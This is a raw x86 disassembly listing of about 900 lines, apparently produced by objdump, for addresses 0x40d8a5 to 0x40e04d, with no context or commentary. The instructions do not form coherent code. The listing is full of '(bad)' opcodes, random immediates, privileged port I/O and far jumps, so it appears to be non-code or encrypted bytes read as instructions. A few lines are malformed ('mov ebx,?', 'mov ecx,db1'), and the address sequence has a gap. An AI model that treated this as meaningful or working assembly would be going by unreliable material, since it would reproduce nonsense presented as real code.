  40d8a5:	mov    al,0x61
  40d8a7:	test   al,0xdc
  40d8a9:	jae    0x40d8a6
  40d8ab:	fwait
  40d8ac:	lock stc 
  40d8ae:	loope  0x40d8a8
  40d8b0:	nop
  40d8b1:	cmp    al,0xfa
  40d8b3:	mov    dh,0xe2
  40d8b5:	or     al,0xa
  40d8b7:	adc    bh,BYTE PTR [ecx]
  40d8b9:	mov    DWORD PTR [edi],edx
  40d8bb:	mov    ch,0x3a
  40d8bd:	mov    dl,0xaf
  40d8bf:	call   0x1c21:0x6dbf8047
  40d8c6:	(bad)  
  40d8c7:	fisttp WORD PTR [edx]
  40d8c9:	lods   eax,DWORD PTR ds:[esi]
  40d8ca:	push   esp
  40d8cb:	sub    al,0xe7
  40d8cd:	sbb    ah,BYTE PTR ds:0xe3157109
  40d8d3:	pusha  
  40d8d4:	fld    QWORD PTR [edx]
  40d8d6:	mov    ebp,0x8fec0411
  40d8db:	or     BYTE PTR [ecx-0x1c001c17],al
  40d8e1:	xor    ebx,DWORD PTR [edi+0x699a3601]
  40d8e7:	shr    BYTE PTR [edi],cl
  40d8e9:	mov    cl,BYTE PTR [edi+0x2c]
  40d8ec:	or     bl,bl
  40d8ee:	or     eax,0xf5e917c4
  40d8f3:	push   ebp
  40d8f4:	push   eax
  40d8f5:	loopne 0x40d959
  40d8f7:	xor    DWORD PTR ds:0x4780b1e6,0x481e4792
  40d901:	and    edi,esi
  40d903:	nop
  40d904:	dec    eax
  40d905:	inc    BYTE PTR [ebx+0x36e2b5fb]
  40d90b:	xor    al,0x6c
  40d90d:	and    DWORD PTR [ebx-0x7],edx
  40d910:	fnstcw WORD PTR [ebx+0x35]
  40d913:	test   al,0xc6
  40d915:	inc    ebp
  40d916:	lods   eax,DWORD PTR ds:[esi]
  40d917:	icebp  
  40d918:	outs   dx,BYTE PTR ds:[esi]
  40d919:	and    al,0x22
  40d91b:	mov    BYTE PTR [edx+0xe],0xc2
  40d91f:	pop    es
  40d920:	pop    eax
  40d921:	test   BYTE PTR [ecx-0x7470f1b9],ah
  40d927:	ret    
  40d928:	jbe    0x40d919
  40d92a:	dec    ebp
  40d92b:	sub    ecx,DWORD PTR [eax-0x4defc41a]
  40d931:	jp     0x40d91f
  40d933:	inc    edi
  40d934:	push   es
  40d935:	mov    DWORD PTR [eax+0x28bf3e0d],esp
  40d93b:	bnd jg 0x40d8be
  40d93e:	jp     0x40d9b7
  40d940:	dec    ecx
  40d941:	mov    WORD PTR [eax-0x199e8d7c],cs
  40d947:	popf   
  40d948:	sub    dl,bl
  40d94a:	mov    ds:0x2eaf429,al
  40d94f:	in     eax,0x27
  40d951:	sbb    DWORD PTR [edi],edx
  40d953:	and    eax,0x7d93ba5a
  40d958:	out    0x3c,al
  40d95a:	mov    edx,0x732cd916
  40d95f:	xor    ah,0xc0
  40d962:	sbb    dh,dl
  40d964:	stos   DWORD PTR es:[edi],eax
  40d965:	fcmovu st,st(6)
  40d967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d968:	retf   0xba7a
  40d96b:	and    BYTE PTR [ebx-0x62],0xc6
  40d96f:	xchg   DWORD PTR [ebx+0x54],eax
  40d972:	sbb    eax,0xb0f0f07f
  40d977:	xchg   ebp,ebx
  40d979:	add    eax,0x43f0142f
  40d97e:	inc    edx
  40d97f:	adc    al,dl
  40d981:	out    0x19,al
  40d983:	das    
  40d984:	and    DWORD PTR ds:0xc9e9a996,eax
  40d98a:	pop    ds
  40d98b:	es out 0x57,al
  40d98e:	xor    al,0x29
  40d990:	and    esi,DWORD PTR [esi+0x20]
  40d993:	loope  0x40d98f
  40d995:	cmp    eax,0xc8bb31bc
  40d99a:	inc    esi
  40d99b:	mov    dl,0xaf
  40d99d:	fsub   QWORD PTR [ecx+eiz*1-0x436150dc]
  40d9a4:	mov    dh,0xff
  40d9a6:	ins    BYTE PTR es:[edi],dx
  40d9a7:	xchg   esi,eax
  40d9a8:	iret   
  40d9a9:	in     eax,dx
  40d9aa:	mov    bh,0xc6
  40d9ac:	mov    ds,WORD PTR [eax]
  40d9ae:	scas   eax,DWORD PTR es:[edi]
  40d9af:	rcr    DWORD PTR [edx+0x1e],0x36
  40d9b3:	outs   dx,DWORD PTR ds:[esi]
  40d9b4:	jp     0x40d9cd
  40d9b6:	in     al,0xd8
  40d9b8:	addr16 mov eax,0xa8fd3bee
  40d9be:	aaa    
  40d9bf:	ins    DWORD PTR es:[edi],dx
  40d9c0:	fisttp DWORD PTR [eax]
  40d9c2:	or     eax,0x1fe92e8c
  40d9c7:	xor    DWORD PTR [eax+eiz*1-0x22e3da5],esi
  40d9ce:	push   eax
  40d9cf:	dec    ebx
  40d9d0:	mov    ah,0x7f
  40d9d2:	adc    esp,DWORD PTR [edi]
  40d9d4:	fisub  DWORD PTR [ebx+0x5f0ec0dd]
  40d9da:	add    esi,ebx
  40d9dc:	popa   
  40d9dd:	addr16 std 
  40d9df:	fwait
  40d9e0:	mov    edx,0x483c18f5
  40d9e5:	mov    al,ds:0xc13ece33
  40d9eb:	leave  
  40d9ec:	mov    ebx,0x452b53b6
  40d9f1:	sbb    DWORD PTR [esi-0x3eb92f84],edi
  40d9f7:	or     eax,0xf4d773e9
  40d9fc:	in     eax,0x69
  40d9fe:	push   cs
  40d9ff:	jl     0x40d9dd
  40da01:	clc    
  40da02:	mov    ebx,0x8567f381
  40da07:	pop    esi
  40da08:	jp     0x40da17
  40da0a:	inc    ebx
  40da0b:	and    BYTE PTR [edi+0x38],0x70
  40da0f:	xchg   dh,al
  40da11:	lock mov ah,BYTE PTR [ebx+0x236c3a40]
  40da18:	inc    edx
  40da19:	mov    esp,DWORD PTR [esi+0x5e]
  40da1c:	dec    ecx
  40da1d:	pop    ebp
  40da1e:	ins    BYTE PTR es:[edi],dx
  40da1f:	call   0x24dff051
  40da24:	inc    ebx
  40da25:	cwde   
  40da26:	xor    DWORD PTR ds:0x597e54a3,ebp
  40da2c:	sti    
  40da2d:	or     DWORD PTR [edi],eax
  40da2f:	test   al,0xe1
  40da31:	pusha  
  40da32:	xlat   BYTE PTR ds:[ebx]
  40da33:	jo     0x40da39
  40da35:	inc    edx
  40da36:	adc    al,0xfd
  40da38:	mov    ss,WORD PTR [eax+0x48]
  40da3b:	cld    
  40da3c:	enter  0x82d5,0x7c
  40da40:	out    0xc8,al
  40da42:	std    
  40da43:	dec    dl
  40da45:	mov    edi,0x4ef02cef
  40da4a:	lea    esp,[edi+0x44]
  40da4d:	lods   eax,DWORD PTR ds:[esi]
  40da4e:	lock hlt 
  40da50:	jmp    FWORD PTR [esi+0x1]
  40da53:	mov    edx,0x57406eef
  40da58:	mov    edi,0x51bae5bb
  40da5d:	sub    DWORD PTR [eax+0x66],edi
  40da60:	int3   
  40da61:	lahf   
  40da62:	je     0x40dab9
  40da64:	xor    BYTE PTR [ecx+0x77],bl
  40da67:	jmp    0x40da69
  40da69:	sbb    BYTE PTR [eax-0x649cdd01],ah
  40da6f:	repz clc 
  40da71:	ds aaa 
  40da73:	ret    
  40da74:	jns    0x40daaa
  40da76:	mov    dl,0x40
  40da78:	(bad)  
  40da79:	jmp    0x40da14
  40da7b:	and    dh,BYTE PTR [ebx-0x1704f44c]
  40da81:	adc    ah,cl
  40da83:	and    al,0xcc
  40da85:	iret   
  40da86:	xchg   ebp,eax
  40da87:	les    edx,FWORD PTR [ebp+0x4a2a9b16]
  40da8d:	test   BYTE PTR [esi+0x68],0xa1
  40da91:	int    0xb0
  40da93:	or     dh,BYTE PTR [ebx]
  40da95:	sub    ebp,DWORD PTR fs:0xd628415d
  40da9c:	adc    BYTE PTR [edx-0x37feda49],0xac
  40daa3:	pop    esp
  40daa4:	sti    
  40daa5:	cdq    
  40daa6:	mov    ch,0x92
  40daa8:	and    eax,0x1c0e3992
  40daad:	pop    eax
  40daae:	aas    
  40daaf:	sub    DWORD PTR [ecx+edi*2-0x4f22afb2],edi
  40dab6:	(bad)  
  40dab7:	sbb    eax,0x47c97bfc
  40dabc:	imul   ecx,ecx,0xbb3dac3a
  40dac2:	fwait
  40dac3:	inc    eax
  40dac4:	sbb    eax,0xa8c67a8b
  40dac9:	scas   eax,DWORD PTR es:[edi]
  40daca:	retf   0x9597
  40dacd:	int    0xbb
  40dacf:	jge    0x40db17
  40dad1:	aaa    
  40dad2:	and    edi,DWORD PTR [ecx-0x13]
  40dad5:	or     eax,0x610b58c2
  40dada:	sbb    al,0xa6
  40dadc:	sbb    ebx,esi
  40dade:	call   0x687e8beb
  40dae3:	jl     0x40db0b
  40dae5:	pusha  
  40dae6:	and    ebx,DWORD PTR [edx+0x22b7eaef]
  40daec:	es call 0xdf1bf14c
  40daf2:	out    dx,eax
  40daf3:	retf   0xc06f
  40daf6:	imul   ecx,DWORD PTR [esi+0x320c8793],0x5c
  40dafd:	or     bh,bh
  40daff:	xor    al,0x6c
  40db01:	mov    DWORD PTR [ebx+0x4aea122b],edi
  40db07:	popa   
  40db08:	lock add edx,esi
  40db0b:	and    eax,0xefa335c8
  40db10:	sar    bl,1
  40db12:	sub    al,0x12
  40db14:	dec    edi
  40db15:	js     0x40db57
  40db17:	sar    BYTE PTR ds:[esi+0x1c],cl
  40db1b:	aam    0xad
  40db1d:	mov    ebp,0x6214db4e
  40db22:	inc    edx
  40db23:	rol    DWORD PTR [edi+0x26163bc8],cl
  40db29:	sbb    eax,0x4834e01
  40db2e:	neg    BYTE PTR [eax+eiz*1+0x6333eb9c]
  40db35:	test   al,0x34
  40db37:	mov    eax,0x4c81b556
  40db3c:	aas    
  40db3d:	sub    eax,0xf5d0820a
  40db42:	or     DWORD PTR [edx],ebp
  40db44:	or     BYTE PTR [edx+ebx*1+0x4c],dh
  40db48:	sahf   
  40db49:	neg    DWORD PTR [esi]
  40db4b:	mov    ebx,?
  40db4d:	in     al,0x96
  40db4f:	out    0xe9,eax
  40db51:	popa   
  40db52:	retf   
  40db53:	test   ebp,0xe53e342e
  40db59:	jb     0x40db51
  40db5b:	lds    edi,FWORD PTR [eax]
  40db5d:	out    dx,eax
  40db5e:	mov    al,0x42
  40db60:	xor    DWORD PTR [edi+0x1ab060ab],eax
  40db66:	fwait
  40db67:	inc    ebp
  40db68:	sbb    cl,BYTE PTR ds:0xcf74f5e9
  40db6e:	sar    DWORD PTR [edi-0x2c],1
  40db71:	cmp    DWORD PTR [eax+edi*2-0x74],esi
  40db75:	jnp    0x40db0a
  40db77:	sub    ebp,DWORD PTR [edi-0x1d70e59a]
  40db7d:	test   BYTE PTR [esi-0x65],ah
  40db80:	xchg   esp,eax
  40db81:	outs   dx,DWORD PTR ds:[esi]
  40db82:	add    eax,0x1623da25
  40db87:	sti    
  40db88:	push   ds
  40db89:	cmp    eax,edi
  40db8b:	push   cs
  40db8c:	mov    ebp,0x4fa93be3
  40db91:	pop    esi
  40db92:	push   ebx
  40db93:	pop    eax
  40db94:	aas    
  40db95:	div    BYTE PTR [ecx]
  40db97:	jbe    0x40dbd1
  40db99:	outs   dx,DWORD PTR ds:[esi]
  40db9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db9b:	sub    edx,DWORD PTR [esi]
  40db9d:	xor    BYTE PTR [ecx],ah
  40db9f:	std    
  40dba0:	mov    eax,0x51db4f79
  40dba5:	ds jmp 0x40dc17
  40dba8:	shr    DWORD PTR [edi],0xa
  40dbab:	mov    cl,0xa9
  40dbad:	(bad)  
  40dbae:	cwde   
  40dbaf:	test   cl,ah
  40dbb1:	mov    dh,0xf2
  40dbb3:	and    dh,BYTE PTR [ebx+edi*1]
  40dbb6:	sub    eax,esp
  40dbb8:	das    
  40dbb9:	pop    esp
  40dbba:	jl     0x40dc2b
  40dbbc:	adc    eax,0xe88f6ca8
  40dbc1:	xor    DWORD PTR [ecx+0x5b0ceb5e],ebx
  40dbc7:	lods   al,BYTE PTR ds:[esi]
  40dbc8:	jecxz  0x40db5a
  40dbca:	cdq    
  40dbcb:	inc    eax
  40dbcc:	sbb    DWORD PTR [edi-0xd],edx
  40dbcf:	jbe    0x40dc2f
  40dbd1:	pop    ebp
  40dbd2:	xchg   esp,eax
  40dbd3:	sub    bh,BYTE PTR [ecx+0x49]
  40dbd6:	ins    BYTE PTR es:[edi],dx
  40dbd7:	mov    esp,0x3f7cbdd2
  40dbdc:	loopne 0x40dc0d
  40dbde:	xchg   esi,eax
  40dbdf:	pop    ebx
  40dbe0:	test   eax,0x1daf141a
  40dbe5:	into   
  40dbe6:	popa   
  40dbe7:	call   0x70b3:0xeaa64cc8
  40dbee:	call   0x19b98f2b
  40dbf3:	dec    ebp
  40dbf4:	jg     0x40dc5c
  40dbf6:	adc    ch,al
  40dbf8:	xor    ecx,DWORD PTR [edi+edi*1-0x444ab9f1]
  40dbff:	sar    DWORD PTR [edx+0x77],1
  40dc02:	xor    ebp,DWORD PTR [edx]
  40dc04:	hlt    
  40dc05:	add    eax,0x3c393245
  40dc0a:	mov    ecx,db1
  40dc0d:	retf   
  40dc0e:	repz or BYTE PTR [edx],bh
  40dc11:	xor    esp,DWORD PTR [ebp-0x71208a9f]
  40dc17:	and    al,0x61
  40dc19:	(bad)  
  40dc1a:	jmp    DWORD PTR [edi]
  40dc1c:	adc    BYTE PTR [edi-0x76],cl
  40dc1f:	das    
  40dc20:	cld    
  40dc21:	out    dx,eax
  40dc22:	mov    dh,0x18
  40dc24:	ss mov eax,0xba56b378
  40dc2a:	inc    edx
  40dc2b:	aaa    
  40dc2c:	mov    BYTE PTR [esi+edi*2],bl
  40dc2f:	pop    es
  40dc30:	test   eax,0x9afd6724
  40dc35:	mov    dh,0xa4
  40dc37:	daa    
  40dc38:	pop    edx
  40dc39:	sbb    al,0x63
  40dc3b:	inc    esi
  40dc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc3d:	inc    ecx
  40dc3e:	in     eax,0xf8
  40dc40:	cmp    al,dl
  40dc42:	je     0x40dbfe
  40dc44:	inc    esp
  40dc45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc46:	in     eax,0x46
  40dc48:	or     eax,0xd02cbd1e
  40dc4d:	js     0x40dcc2
  40dc4f:	adc    al,0x49
  40dc51:	loop   0x40dcbc
  40dc53:	or     al,0x3d
  40dc55:	sar    DWORD PTR [edi-0x4fedfddf],cl
  40dc5b:	fstp   QWORD PTR [edx]
  40dc5d:	loopne 0x40dc1d
  40dc5f:	mov    BYTE PTR [ebx+0x4b],bh
  40dc62:	imul   esi,ebx,0x5a
  40dc65:	sub    al,0xdc
  40dc67:	push   esp
  40dc68:	jns    0x40dc53
  40dc6a:	pop    edi
  40dc6b:	mov    ebp,0xe14ba8e6
  40dc70:	lds    ebx,FWORD PTR ss:[edi-0x8]
  40dc74:	mov    al,ds:0xec620b9
  40dc79:	jmp    0xef90:0x38b4969b
  40dc80:	jmp    0xef52b88
  40dc85:	in     al,0x8
  40dc87:	mov    eax,fs
  40dc89:	lea    esp,[edi]
  40dc8b:	xlat   BYTE PTR ds:[ebx]
  40dc8c:	fcmovnbe st,st(7)
  40dc8e:	adc    BYTE PTR ds:0xee5f5b7c,al
  40dc94:	imul   ebx,DWORD PTR [edi],0xa779e3b
  40dc9a:	pop    esp
  40dc9b:	test   BYTE PTR [esi],cl
  40dc9d:	sub    edi,ebp
  40dc9f:	pushf  
  40dca0:	ss mov ecx,0xee2e4e43
  40dca6:	sbb    eax,0x61490f26
  40dcab:	ss iret 
  40dcad:	xchg   edx,eax
  40dcae:	into   
  40dcaf:	fidiv  DWORD PTR [ebx+0x7da00850]
  40dcb5:	shl    DWORD PTR [esi-0x273cda3b],cl
  40dcbb:	test   BYTE PTR [ecx],al
  40dcbd:	or     ah,BYTE PTR [edi]
  40dcbf:	pushf  
  40dcc0:	sub    al,0x9f
  40dcc2:	ins    BYTE PTR es:[edi],dx
  40dcc3:	addr16 jb 0x40dcd7
  40dcc6:	and    ecx,DWORD PTR [esi+ecx*1]
  40dcc9:	popa   
  40dcca:	cmc    
  40dccb:	xchg   dl,dl
  40dccd:	cdq    
  40dcce:	dec    edi
  40dccf:	xchg   BYTE PTR [edx-0x4e09693a],ah
  40dcd5:	inc    edi
  40dcd6:	jmp    0x40dd17
  40dcd8:	fsub   st(0),st
  40dcda:	ins    BYTE PTR es:[edi],dx
  40dcdb:	aad    0x13
  40dcdd:	dec    ebx
  40dcde:	popa   
  40dcdf:	aad    0x9f
  40dce1:	pop    ecx
  40dce2:	add    DWORD PTR [edi],edi
  40dce4:	popf   
  40dce5:	push   edi
  40dce6:	lea    eax,[edi-0x60712519]
  40dcec:	adc    edx,0x701df736
  40dcf2:	cmp    BYTE PTR [ebx-0x52bbd942],cl
  40dcf8:	xor    eax,0x84c9301a
  40dcfd:	add    eax,DWORD PTR [ecx+ebp*2]
  40dd00:	xchg   BYTE PTR [edx-0x42124789],ah
  40dd06:	shl    DWORD PTR [esi-0x3e6fb0d8],0xfa
  40dd0d:	adc    al,0x6
  40dd0f:	and    BYTE PTR [edi+ecx*8],bh
  40dd12:	dec    ebp
  40dd13:	inc    edi
  40dd14:	pop    edi
  40dd15:	test   BYTE PTR [edx+0x3f589301],ch
  40dd1b:	call   0x3248:0xe5ecca67
  40dd22:	std    
  40dd23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd24:	add    DWORD PTR [ecx-0x56d56a9b],edi
  40dd2a:	mov    esp,0xf6d41ce1
  40dd2f:	mov    eax,ds:0x8e430536
  40dd34:	jb     0x40dd42
  40dd36:	es pop ecx
  40dd38:	loope  0x40dd05
  40dd3a:	mov    ch,0x9f
  40dd3c:	mov    DWORD PTR ds:0x484760a6,edx
  40dd42:	in     eax,0x30
  40dd44:	js     0x40dd70
  40dd46:	xchg   esp,eax
  40dd47:	cmp    dh,BYTE PTR [edx-0x66]
  40dd4a:	xor    BYTE PTR [ebx-0x3d],0x5e
  40dd4e:	retf   0xa093
  40dd51:	push   DWORD PTR [edi-0x2c]
  40dd54:	int    0xb
  40dd56:	stc    
  40dd57:	pop    es
  40dd58:	arpl   WORD PTR [ebp+0x53d84e4b],ax
  40dd5e:	dec    ebx
  40dd5f:	xor    DWORD PTR ds:0xec698fc0,esi
  40dd65:	in     al,dx
  40dd66:	popa   
  40dd67:	xchg   ebx,eax
  40dd68:	mov    DWORD PTR [eax+0x2abeb455],esi
  40dd6e:	pop    ebp
  40dd6f:	and    ecx,DWORD PTR [ebx+0x5810928e]
  40dd75:	sbb    ebx,ebp
  40dd77:	rcr    BYTE PTR [eax-0x5e5ec8b6],0x8f
  40dd7e:	or     al,0x8b
  40dd80:	pop    eax
  40dd81:	inc    ecx
  40dd82:	fisttp QWORD PTR [edi+0x4a]
  40dd85:	inc    edx
  40dd86:	cmc    
  40dd87:	xchg   BYTE PTR [eax],al
  40dd89:	sub    al,0x3d
  40dd8b:	push   esp
  40dd8c:	sbb    eax,0xf905203e
  40dd91:	fsub   QWORD PTR [esi+0x3afa5c43]
  40dd97:	xchg   ebp,eax
  40dd98:	mov    ebx,0x510ecf78
  40dd9d:	fstp   QWORD PTR [esi-0x33]
  40dda0:	push   cs
  40dda1:	psubb  mm3,mm5
  40dda4:	js     0x40dda8
  40dda6:	nop
  40dda7:	fnstcw WORD PTR [esi-0x64]
  40ddaa:	loopne 0x40dd85
  40ddac:	pushf  
  40ddad:	mov    ch,BYTE PTR [edi+0x1b]
  40ddb0:	bound  eax,QWORD PTR es:[edx+0x53e1087c]
  40ddb7:	push   edx
  40ddb8:	dec    edx
  40ddb9:	sar    DWORD PTR [edx+0x1e],1
  40ddbc:	sub    BYTE PTR [edi+0x5eae1a96],0xdf
  40ddc3:	xor    DWORD PTR [eax],ebp
  40ddc5:	mov    ds:0xba5c9a39,al
  40ddca:	jbe    0x40de05
  40ddcc:	pop    esi
  40ddcd:	test   DWORD PTR [ebp-0x2d],ebx
  40ddd0:	jge    0x40ddf0
  40ddd2:	add    eax,DWORD PTR [esi-0x31]
  40ddd5:	cmp    BYTE PTR [ecx+esi*4-0x5427e32c],bl
  40dddc:	or     al,0x7f
  40ddde:	sub    edi,ebp
  40dde0:	push   ds
  40dde1:	xchg   esp,eax
  40dde2:	mov    eax,0x2b106d56
  40dde7:	(bad)  
  40dde8:	pop    edx
  40dde9:	push   0xcd8a9386
  40ddee:	stos   DWORD PTR es:[edi],eax
  40ddef:	shl    BYTE PTR [edi-0x24],0x17
  40ddf3:	xor    cl,dl
  40ddf5:	or     ecx,ebp
  40ddf7:	mov    bl,0x58
  40ddf9:	loope  0x40dd7b
  40ddfb:	add    al,0x81
  40ddfd:	inc    eax
  40ddfe:	sar    ebp,0x96
  40de01:	mov    dl,0x6c
  40de03:	mov    cs,WORD PTR [ebx+0x72ddfd66]
  40de09:	mov    edx,0x771b375e
  40de0e:	jmp    0x40de39
  40de10:	inc    esi
  40de11:	into   
  40de12:	ror    DWORD PTR [edx],0x7f
  40de15:	mov    cl,0x82
  40de17:	fdiv   st(5),st
  40de19:	xchg   esp,eax
  40de1a:	lea    ebp,[eax-0x2e92a96d]
  40de20:	int3   
  40de21:	(bad)  
  40de22:	push   cs
  40de23:	shl    esi,cl
  40de25:	imul   esi,DWORD PTR [edx],0x52b5e494
  40de2b:	inc    ecx
  40de2c:	pop    edi
  40de2d:	sbb    bh,0x86
  40de30:	ret    
  40de31:	fimul  DWORD PTR [eax-0x67]
  40de34:	inc    eax
  40de35:	cmp    DWORD PTR [ebx-0x33346a17],0xffffffe1
  40de3c:	jle    0x40de2b
  40de3e:	test   al,0x6a
  40de40:	in     eax,0x52
  40de42:	hlt    
  40de43:	mov    dl,0xb9
  40de45:	cs ins DWORD PTR es:[edi],dx
  40de47:	js     0x40dde2
  40de49:	mov    edx,DWORD PTR [eax+0x5b]
  40de4c:	mov    WORD PTR [eax],cs
  40de4e:	pop    eax
  40de4f:	retf   
  40de50:	stos   BYTE PTR es:[edi],al
  40de51:	sbb    dl,bh
  40de53:	xor    al,0xfc
  40de55:	dec    eax
  40de56:	mov    ds:0x8167bb08,al
  40de5b:	cmp    eax,0x3b215b31
  40de60:	cdq    
  40de61:	das    
  40de62:	mov    edi,0xfe396954
  40de67:	push   ss
  40de68:	cwde   
  40de69:	push   edx
  40de6a:	or     ch,BYTE PTR [ecx+eax*1+0x25e86497]
  40de71:	cmp    ah,BYTE PTR [ebx]
  40de73:	icebp  
  40de74:	sub    ebp,esp
  40de76:	mov    ebx,0xa87af596
  40de7b:	dec    ebp
  40de7c:	loopne 0x40def6
  40de7e:	adc    esi,esp
  40de80:	cmp    eax,0x13b90052
  40de85:	dec    edi
  40de86:	mov    ebp,0x8478417e
  40de8b:	add    esi,ebx
  40de8d:	jmp    0x7b2e:0xb1975128
  40de94:	pop    ecx
  40de95:	inc    edi
  40de96:	inc    eax
  40de97:	enter  0xa5ad,0x4c
  40de9b:	dec    ebx
  40de9c:	add    BYTE PTR [esi],cl
  40de9e:	lods   al,BYTE PTR ds:[esi]
  40de9f:	add    BYTE PTR [eax],ah
  40dea1:	cmp    al,0xc
  40dea3:	xlat   BYTE PTR ds:[ebx]
  40dea4:	pop    es
  40dea5:	shl    al,0x58
  40dea8:	or     eax,0xc415e1d1
  40dead:	mov    ah,0xf4
  40deaf:	lock and DWORD PTR [ebx],edi
  40deb2:	adc    al,0xb2
  40deb4:	push   ebx
  40deb5:	test   al,0x3f
  40deb7:	shl    BYTE PTR [edx],0x1c
  40deba:	add    ecx,esp
  40debc:	in     al,dx
  40debd:	and    BYTE PTR [ebp-0x6264670c],cl
  40dec3:	outs   dx,DWORD PTR ds:[esi]
  40dec4:	out    dx,al
  40dec5:	dec    ebp
  40dec6:	test   DWORD PTR [eax],ecx
  40dec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dec9:	pop    es
  40deca:	into   
  40decb:	ror    esp,0x81
  40dece:	and    al,0x74
  40ded0:	scas   al,BYTE PTR es:[edi]
  40ded1:	add    bl,BYTE PTR [edx-0x444bb8d]
  40ded7:	retf   
  40ded8:	fdecstp 
  40deda:	add    edx,ebx
  40dedc:	scas   eax,DWORD PTR es:[edi]
  40dedd:	jae    0x40de7b
  40dedf:	mov    edx,0x6b86f19a
  40dee4:	xor    DWORD PTR [ebx+0x16],edx
  40dee7:	or     cl,BYTE PTR ds:0xcb891c18
  40deed:	gs popa 
  40deef:	les    ecx,FWORD PTR [esi+0x7bb1db75]
  40def5:	cli    
  40def6:	bound  ecx,QWORD PTR [edi+eax*2]
  40def9:	mov    al,ds:0x2af18b10
  40defe:	inc    edx
  40deff:	das    
  40df00:	(bad)  
  40df01:	jmp    0x40de86
  40df03:	je     0x40df4e
  40df05:	inc    ebp
  40df06:	sub    edi,edi
  40df08:	mov    dl,0xf9
  40df0a:	jae    0x40df7e
  40df0c:	loopne 0x40df45
  40df0e:	ror    DWORD PTR [edx+0x76],1
  40df11:	xchg   ecx,eax
  40df12:	(bad)  
  40df13:	pop    eax
  40df14:	into   
  40df15:	pop    esp
  40df16:	jl     0x40def9
  40df18:	lahf   
  40df19:	adc    DWORD PTR [ebx],eax
  40df1b:	xor    BYTE PTR [eax+0x9],bl
  40df1e:	arpl   WORD PTR [edx-0x53],ax
  40df21:	jb     0x40df68
  40df23:	das    
  40df24:	cmp    al,0x27
  40df26:	(bad)
  40df2c:	xchg   ebp,eax
  40df2d:	in     eax,0x84
  40df2f:	les    esp,FWORD PTR [esi]
  40df31:	ficom  DWORD PTR [ebp+0x4c31f3a3]
  40df37:	and    al,BYTE PTR [esi+0x2e2e9ca5]
  40df3d:	jge    0x40dfaa
  40df3f:	dec    esp
  40df40:	pusha  
  40df41:	xchg   esp,eax
  40df42:	mov    edx,0x8122853e
  40df47:	retf   0x97d3
  40df4a:	sti    
  40df4b:	scas   eax,DWORD PTR es:[edi]
  40df4c:	loopne 0x40dfa9
  40df4e:	xchg   esp,eax
  40df4f:	test   al,0xf2
  40df51:	leave  
  40df52:	fdivp  st(0),st
  40df54:	xor    al,BYTE PTR [ebx]
  40df56:	cdq    
  40df57:	jae    0x40df54
  40df59:	xchg   DWORD PTR [ebx-0x30],edi
  40df5c:	(bad)  
  40df5d:	ss jge 0x40dee1
  40df60:	out    dx,al
  40df61:	xor    DWORD PTR [ebx],esi
  40df63:	sbb    al,cl
  40df65:	push   es
  40df66:	inc    eax
  40df67:	sbb    dh,BYTE PTR [ecx]
  40df69:	(bad)  
  40df6a:	sub    eax,0xaa7c6b3b
  40df6f:	jb     0x40df4d
  40df71:	push   es
  40df72:	xchg   esp,eax
  40df73:	pushf  
  40df74:	cdq    
  40df75:	sub    edi,DWORD PTR [eax+0x55f04c62]
  40df7b:	mov    eax,ds:0xc8f2d3de
  40df80:	cmp    ecx,edx
  40df82:	lahf   
  40df83:	lahf   
  40df84:	int    0x4c
  40df86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df87:	mov    dh,0x5e
  40df89:	fcmovnu st,st(5)
  40df8b:	adc    DWORD PTR [esi-0x59dd5f80],ebx
  40df91:	stos   DWORD PTR es:[edi],eax
  40df92:	sub    eax,0x15c67c95
  40df97:	inc    ebp
  40df98:	pop    edx
  40df99:	xor    dl,0x89
  40df9c:	retw   0xd7f2
  40dfa0:	sub    al,0xb7
  40dfa2:	retf   0x848
  40dfa5:	sbb    ecx,DWORD PTR ds:0xdc35aaa5
  40dfab:	sub    DWORD PTR [edi+0x42],esi
  40dfae:	and    al,0xb5
  40dfb0:	mov    ah,0x79
  40dfb2:	pop    ebp
  40dfb3:	(bad)  
  40dfb4:	fmul   QWORD PTR [ebx+edx*2+0x3028a965]
  40dfbb:	test   BYTE PTR [esi-0xf],al
  40dfbe:	push   ds
  40dfbf:	cmp    esi,DWORD PTR [edi+esi*1+0x2d]
  40dfc3:	xchg   edi,eax
  40dfc4:	jmp    DWORD PTR [esi]
  40dfc6:	mov    esi,0x44ebb344
  40dfcb:	out    0x7b,al
  40dfcd:	pop    es
  40dfce:	xor    esp,DWORD PTR [ebx]
  40dfd0:	sub    al,0x64
  40dfd2:	push   es
  40dfd3:	mov    ecx,0x6550b17c
  40dfd8:	mov    ebp,0xee293959
  40dfdd:	mov    BYTE PTR [edi],dh
  40dfdf:	pop    esp
  40dfe0:	mov    ch,0x49
  40dfe2:	mov    BYTE PTR ds:0xda049bcb,bl
  40dfe8:	xchg   BYTE PTR [eax+0x5f],cl
  40dfeb:	mov    esp,0x3d72a704
  40dff0:	outs   dx,BYTE PTR ds:[esi]
  40dff1:	xor    edx,esi
  40dff3:	mov    BYTE PTR [eax+0x7e],bl
  40dff6:	mov    eax,0xd6581c13
  40dffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dffc:	dec    ebp
  40dffd:	mov    ebx,0x5437d2eb
  40e002:	mov    ebp,0x6cf84636
  40e007:	in     eax,0x17
  40e009:	mov    al,0xc8
  40e00b:	mov    edx,0x45eb187c
  40e010:	dec    BYTE PTR ds:0xa98ee16c
  40e016:	inc    edi
  40e017:	xchg   ebp,eax
  40e018:	imul   edi,DWORD PTR [eax-0x58f97621],0x7b
  40e01f:	cmp    al,0x85
  40e021:	repnz stos BYTE PTR es:[edi],al
  40e023:	shl    edi,1
  40e025:	sub    DWORD PTR [eax-0x47],ebp
  40e028:	or     ah,BYTE PTR [esi-0x2e0081e0]
  40e02e:	or     edi,edi
  40e030:	cmp    eax,0x716e1aef
  40e035:	sub    al,0x9f
  40e037:	dec    esi
  40e038:	test   al,0xa3
  40e03a:	pop    es
  40e03b:	nop
  40e03c:	call   0x44120b6f
  40e041:	mov    ah,0x2a
  40e043:	inc    eax
  40e044:	mov    BYTE PTR ds:0xfd0889f3,ch
  40e04a:	inc    edi
  40e04b:	mov    edi,edi
  40e04d:	jl     0x40e0a4
